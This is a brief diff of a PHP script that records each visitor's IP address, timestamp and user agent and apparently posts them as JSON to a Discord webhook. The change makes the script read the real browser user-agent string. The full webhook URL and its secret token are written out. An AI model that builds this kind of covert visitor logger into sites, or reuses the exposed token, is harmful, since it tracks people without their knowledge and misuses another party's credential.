@@ -15,7 +15,7 @@
 $webhook = "https://discord.com/api/webhooks/889321054516957215/dSdQ0EJkHy5DeTr_s3Vf9vrahEz81PsYsz0JWqboLkMEUSVLP0C7HJl1Ok2KcBpvmC-2";
 $timestamp = date("c", strtotime("now"));
 $ip = $_SERVER['REMOTE_ADDR'];
-$useragent = $_SERVER['SERVER_NAME'];
+$useragent = $_SERVER['HTTP_USER_AGENT'];
 
 $json_data = json_encode([
 
